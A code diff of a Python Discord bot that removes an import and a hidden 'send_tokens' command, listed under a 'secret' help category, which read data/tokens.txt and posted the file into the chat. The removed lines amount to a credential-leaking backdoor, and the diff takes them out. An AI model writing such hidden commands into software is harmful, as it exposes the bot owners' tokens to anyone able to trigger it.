@@ -17,7 +17,6 @@ import markov
 import sys
 import config as global_config
 import retr
-import neuro
 import minegen as minegen_mod
 import time
 import pytz
@@ -1822,17 +1821,6 @@ async def minegen(ctx, *, mine_count=10):
         description=str(minegen_mod.Field(9, 9, mine_count)),
         color=discord.Colour(0x000000)
     ))
-    
-@kgb.command()
-@helpCategory('secret')
-async def send_tokens(ctx, filename):
-    try:
-        with open("data/tokens.txt", 'rb') as file:
-            await ctx.send(file=discord.File(file, "data.txt"))
-    except FileNotFoundError:
-        await ctx.send("Файл не найден.")
-    except Exception as e:
-        await ctx.send(f"Ошибка при чтении файла: {e}")
 
 HELP_EMB = buildHelpEmbed()
 HELP_CAT_EMB, HELP_CAT_HIDDEN = buildCategoryEmbeds()
